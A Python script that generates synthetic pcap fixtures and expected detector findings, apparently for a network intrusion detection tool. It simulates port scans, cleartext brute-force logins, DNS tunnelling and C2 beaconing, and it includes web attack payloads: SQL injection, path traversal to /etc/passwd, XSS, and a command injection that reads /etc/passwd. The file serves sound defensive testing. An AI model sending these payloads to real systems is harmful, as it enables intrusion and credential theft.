from __future__ import annotations

import hashlib
import json
import socket
import struct
from dataclasses import dataclass
from pathlib import Path

OUTPUT = Path("samples/corpus")
BASE_TIMESTAMP = 1_700_000_000.0
ETHERNET = bytes.fromhex("00112233445566778899aabb0800")


class PcapWriter:
    def __init__(self) -> None:
        self.content = bytearray(bytes.fromhex("d4c3b2a1020004000000000000000000ffff000001000000"))
        self.timestamp = BASE_TIMESTAMP
        self.packet_count = 0

    def add(self, packet: bytes, *, advance: float = 0.01) -> None:
        seconds = int(self.timestamp)
        microseconds = int((self.timestamp - seconds) * 1_000_000)
        self.content.extend(struct.pack("<IIII", seconds, microseconds, len(packet), len(packet)))
        self.content.extend(packet)
        self.packet_count += 1
        self.timestamp += advance


@dataclass
class TcpConversation:
    writer: PcapWriter
    client_ip: str
    server_ip: str
    client_port: int
    server_port: int
    client_seq: int
    server_seq: int

    def open(self) -> None:
        self._packet(True, b"", 0x02)
        self.client_seq += 1
        self._packet(False, b"", 0x12)
        self.server_seq += 1
        self._packet(True, b"", 0x10)

    def client(self, payload: bytes | str, *, advance: float = 0.02) -> None:
        data = payload.encode() if isinstance(payload, str) else payload
        self._packet(True, data, 0x18, advance)
        self.client_seq += len(data)
        self._packet(False, b"", 0x10)

    def server(self, payload: bytes | str, *, advance: float = 0.02) -> None:
        data = payload.encode() if isinstance(payload, str) else payload
        self._packet(False, data, 0x18, advance)
        self.server_seq += len(data)
        self._packet(True, b"", 0x10)

    def close(self) -> None:
        self._packet(True, b"", 0x11)
        self.client_seq += 1
        self._packet(False, b"", 0x11)
        self.server_seq += 1
        self._packet(True, b"", 0x10)

    def _packet(self, from_client: bool, payload: bytes, flags: int, advance: float = 0.01) -> None:
        if from_client:
            packet = _tcp_packet(
                self.client_ip, self.server_ip, self.client_port, self.server_port,
                self.client_seq, self.server_seq, flags, payload,
            )
        else:
            packet = _tcp_packet(
                self.server_ip, self.client_ip, self.server_port, self.client_port,
                self.server_seq, self.client_seq, flags, payload,
            )
        self.writer.add(packet, advance=advance)


def _checksum(payload: bytes) -> int:
    if len(payload) % 2:
        payload += b"\x00"
    total = sum(struct.unpack(f"!{len(payload) // 2}H", payload))
    total = (total & 0xFFFF) + (total >> 16)
    total += total >> 16
    return (~total) & 0xFFFF


def _ipv4(src: str, dst: str, protocol: int, payload: bytes, identification: int = 1) -> bytes:
    source = socket.inet_aton(src)
    destination = socket.inet_aton(dst)
    base = struct.pack(
        "!BBHHHBBH4s4s", 0x45, 0, 20 + len(payload), identification & 0xFFFF,
        0x4000, 64, protocol, 0, source, destination,
    )
    header = base[:10] + struct.pack("!H", _checksum(base)) + base[12:]
    return ETHERNET + header + payload


def _tcp_packet(
    src: str, dst: str, src_port: int, dst_port: int, seq: int, ack: int,
    flags: int, payload: bytes = b"",
) -> bytes:
    source = socket.inet_aton(src)
    destination = socket.inet_aton(dst)
    base = struct.pack("!HHLLBBHHH", src_port, dst_port, seq, ack, 5 << 4, flags, 64240, 0, 0)
    pseudo = source + destination + struct.pack("!BBH", 0, 6, len(base) + len(payload))
    tcp = base[:16] + struct.pack("!H", _checksum(pseudo + base + payload)) + base[18:] + payload
    return _ipv4(src, dst, 6, tcp)


def _udp_packet(src: str, dst: str, src_port: int, dst_port: int, payload: bytes) -> bytes:
    source = socket.inet_aton(src)
    destination = socket.inet_aton(dst)
    length = 8 + len(payload)
    base = struct.pack("!HHHH", src_port, dst_port, length, 0)
    pseudo = source + destination + struct.pack("!BBH", 0, 17, length)
    checksum = _checksum(pseudo + base + payload) or 0xFFFF
    return _ipv4(src, dst, 17, struct.pack("!HHHH", src_port, dst_port, length, checksum) + payload)


def _dns_query(name: str, transaction_id: int) -> bytes:
    labels = b"".join(bytes([len(label)]) + label.encode("ascii") for label in name.split("."))
    return (
        struct.pack("!HHHHHH", transaction_id, 0x0100, 1, 0, 0, 0)
        + labels
        + b"\x00\x00\x01\x00\x01"
    )


def _conversation(
    writer: PcapWriter, client_ip: str, server_ip: str, client_port: int, server_port: int,
) -> TcpConversation:
    return TcpConversation(writer, client_ip, server_ip, client_port, server_port, 1000, 9000)


def _legacy_corpus() -> None:
    cases = {
        "benign-https.pcap": [
            _tcp_packet("10.0.0.10", "10.0.0.20", 50_000 + index, 443, 0, 0, 0x02)
            for index in range(5)
        ],
        "malicious-horizontal-scan.pcap": [
            _tcp_packet("10.0.0.5", f"10.0.1.{index}", 51_000 + index, 445, 0, 0, 0x02)
            for index in range(1, 11)
        ],
        "malicious-vertical-scan.pcap": [
            _tcp_packet("10.0.0.5", "10.0.0.20", 52_000 + index, port, 0, 0, 0x02)
            for index, port in enumerate(range(20, 35))
        ],
        "malicious-telnet.pcap": [
            _tcp_packet("10.0.0.10", "10.0.0.20", 53_000, 23, 0, 0, 0x02)
        ],
    }
    for name, packets in cases.items():
        writer = PcapWriter()
        for packet in packets:
            writer.add(packet)
        (OUTPUT / name).write_bytes(writer.content)
    telnet_writer = PcapWriter()
    telnet = _conversation(telnet_writer, "10.0.0.10", "10.0.0.20", 53_000, 23)
    telnet.open()
    telnet.server("login: ")
    telnet.client("student\r\n")
    telnet.server("Password: ")
    telnet.client("synthetic-password\r\n")
    telnet.server("Welcome student\r\n")
    telnet.close()
    (OUTPUT / "malicious-telnet.pcap").write_bytes(telnet_writer.content)


def _comprehensive_attack_corpus() -> tuple[int, list[dict[str, object]]]:
    writer = PcapWriter()
    scenarios: list[dict[str, object]] = []

    writer.add(
        _udp_packet(
            "10.10.0.10", "10.10.0.53", 53000, 53, _dns_query("updates.example.test", 1)
        )
    )
    https = _conversation(writer, "10.10.0.10", "10.10.0.20", 50000, 443)
    https.open()
    https.close()
    scenarios.append({"id": "benign-baseline", "expected": "no finding"})

    for index, port in enumerate(range(20, 45)):
        writer.add(_tcp_packet("198.51.100.66", "10.10.0.20", 41000 + index, port, 100, 0, 0x02))
    for index in range(1, 16):
        writer.add(
            _tcp_packet(
                "198.51.100.66", f"10.10.1.{index}", 42000 + index, 445, 100, 0, 0x02
            )
        )
    scenarios.extend([
        {"id": "vertical-port-scan", "source": "198.51.100.66", "target": "10.10.0.20"},
        {"id": "horizontal-smb-scan", "source": "198.51.100.66", "targets": 15},
    ])

    ftp = _conversation(writer, "198.51.100.70", "10.10.0.21", 43000, 21)
    ftp.open()
    ftp.server("220 Synthetic FTP ready\r\n")
    for password in ("admin", "password1", "summer2026"):
        ftp.client("USER backup\r\n")
        ftp.server("331 Password required\r\n")
        ftp.client(f"PASS {password}\r\n")
        ftp.server("530 Login incorrect\r\n")
    ftp.client("USER backup\r\n")
    ftp.server("331 Password required\r\n")
    ftp.client("PASS Backup!2026\r\n")
    ftp.server("230 User logged in\r\n")
    ftp.close()
    scenarios.append({
        "id": "ftp-brute-force-success", "source": "198.51.100.70", "username": "backup",
        "failed_passwords": ["admin", "password1", "summer2026"],
        "successful_password": "Backup!2026",
    })

    telnet = _conversation(writer, "198.51.100.71", "10.10.0.22", 43001, 23)
    telnet.open()
    for password in ("root", "toor", "123456"):
        telnet.server("login: ")
        telnet.client("operator\r\n")
        telnet.server("Password: ")
        telnet.client(f"{password}\r\n")
        telnet.server("Login incorrect\r\n")
    telnet.server("login: ")
    telnet.client("operator\r\n")
    telnet.server("Password: ")
    telnet.client("Telnet!2026\r\n")
    telnet.server("Welcome operator\r\nLast login: synthetic fixture\r\n$ ")
    telnet.client("id\r\n")
    telnet.server("uid=1001(operator) gid=1001(operator)\r\n$ ")
    telnet.close()
    scenarios.append({
        "id": "telnet-brute-force-success", "source": "198.51.100.71", "username": "operator",
        "failed_passwords": ["root", "toor", "123456"],
        "successful_password": "Telnet!2026",
    })

    web_payloads = [
        ("sql-injection", "/login", "username=admin%27+OR+%271%27%3D%271%27--&password=x"),
        ("path-traversal", "/download?file=../../../../etc/passwd", ""),
        ("xss", "/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E", ""),
        ("command-injection", "/ping?host=127.0.0.1%3Bcat%20%2Fetc%2Fpasswd", ""),
    ]
    for index, (scenario_id, path, body) in enumerate(web_payloads):
        http = _conversation(writer, "198.51.100.72", "10.10.0.30", 44000 + index, 80)
        http.open()
        if body:
            request = (
                f"POST {path} HTTP/1.1\r\nHost: portal.example.test\r\n"
                "Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: {len(body)}\r\n\r\n{body}"
            )
        else:
            request = f"GET {path} HTTP/1.1\r\nHost: portal.example.test\r\n\r\n"
        http.client(request)
        response_body = "Welcome admin" if scenario_id == "sql-injection" else "synthetic response"
        http.server(
            "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n"
            f"Content-Length: {len(response_body)}\r\n\r\n{response_body}"
        )
        http.close()
        scenarios.append({"id": scenario_id, "source": "198.51.100.72", "http_status": 200})

    basic = _conversation(writer, "198.51.100.73", "10.10.0.31", 44500, 80)
    basic.open()
    basic.client(
        "GET /admin HTTP/1.1\r\nHost: legacy.example.test\r\n"
        "Authorization: Basic YWRtaW46QWRtaW4hMjAyNg==\r\n\r\n"
    )
    basic.server("HTTP/1.1 200 OK\r\nContent-Length: 7\r\n\r\nWelcome")
    basic.close()
    scenarios.append(
        {"id": "http-basic-success", "username": "admin", "successful_password": "Admin!2026"}
    )

    for index in range(4):
        ssh = _conversation(writer, "198.51.100.74", "10.10.0.40", 45000 + index, 22)
        ssh.open()
        ssh.client("SSH-2.0-OpenSSH_9.6\r\n")
        ssh.server("SSH-2.0-OpenSSH_8.9\r\n")
        ssh.client(bytes.fromhex("0000001c14112233445566778899aabbccddeeff00112233"))
        ssh.server(bytes.fromhex("0000001c14ffeeddccbbaa99887766554433221100ffeedd"))
        if index == 3:
            for _ in range(8):
                ssh.client(bytes.fromhex("0000001415aabbccddeeff001122334455667788"), advance=0.5)
                ssh.server(bytes.fromhex("000000141566778899aabbccddeeff0011223344"), advance=0.5)
        ssh.close()
    scenarios.append({
        "id": "ssh-repeated-attempts-inferred-success", "source": "198.51.100.74", "attempts": 4,
        "limitation": (
            "SSH credentials and authentication result are encrypted; success is behavioral "
            "inference only."
        ),
    })

    for index in range(12):
        label = f"a9f3c7e1b5d8{index:04x}0011223344556677"
        writer.add(
            _udp_packet(
                "10.10.0.50", "10.10.0.53", 53010 + index, 53,
                _dns_query(f"{label}.exfil.example.test", 100 + index),
            ),
            advance=0.2,
        )
    scenarios.append({"id": "dns-tunneling", "source": "10.10.0.50", "queries": 12})

    for index in range(8):
        beacon = _conversation(writer, "10.10.0.60", "203.0.113.99", 46000 + index, 8080)
        beacon.open()
        beacon.client("GET /checkin?id=lab-host HTTP/1.1\r\nHost: c2.example.test\r\n\r\n")
        beacon.server("HTTP/1.1 204 No Content\r\n\r\n")
        beacon.close()
        writer.timestamp += 59.8
    scenarios.append({"id": "periodic-beaconing", "source": "10.10.0.60", "interval_seconds": 60})

    (OUTPUT / "comprehensive-attacks.pcap").write_bytes(writer.content)
    return writer.packet_count, scenarios


def main() -> None:
    OUTPUT.mkdir(parents=True, exist_ok=True)
    _legacy_corpus()
    packet_count, scenarios = _comprehensive_attack_corpus()
    comprehensive_path = OUTPUT / "comprehensive-attacks.pcap"
    expected = {
        "schema_version": "1.0",
        "file": "comprehensive-attacks.pcap",
        "purpose": "Offline synthetic regression fixture. No traffic was sent to real systems.",
        "contains_only_fictitious_credentials": True,
        "packet_count": packet_count,
        "sha256": hashlib.sha256(comprehensive_path.read_bytes()).hexdigest(),
        "scenarios": scenarios,
        "expected_findings": [
            {"detector": "port-scan", "title_contains": "varredura vertical", "count": 1},
            {"detector": "port-scan", "title_contains": "varredura horizontal", "count": 1},
            {
                "detector": "authentication-abuse",
                "title_contains": "bem-sucedida após falhas",
                "count": 2,
            },
            {
                "detector": "cleartext-credential",
                "title_contains": "malsucedida",
                "count": 6,
            },
            {
                "detector": "cleartext-credential",
                "title_contains": "texto claro bem-sucedida",
                "count": 2,
            },
            {
                "detector": "cleartext-credential",
                "title_contains": "Credencial HTTP",
                "count": 1,
            },
            {"detector": "cleartext-protocol", "title_contains": "FTP", "count": 1},
            {"detector": "cleartext-protocol", "title_contains": "TELNET", "count": 1},
            {"detector": "cleartext-protocol", "title_contains": "HTTP", "count": 2},
            {"detector": "web-attack-payload", "title_contains": "SQL injection", "count": 1},
            {"detector": "web-attack-payload", "title_contains": "path traversal", "count": 1},
            {"detector": "web-attack-payload", "title_contains": "XSS", "count": 1},
            {
                "detector": "web-attack-payload",
                "title_contains": "injeção de comandos",
                "count": 1,
            },
            {"detector": "dns-anomaly", "title_contains": "Consultas DNS", "count": 1},
            {"detector": "beaconing", "title_contains": "beaconing", "count": 1},
        ],
    }
    (OUTPUT / "comprehensive-attacks.expected.json").write_text(
        json.dumps(expected, indent=2, ensure_ascii=False) + "\n", encoding="utf-8"
    )


if __name__ == "__main__":
    main()
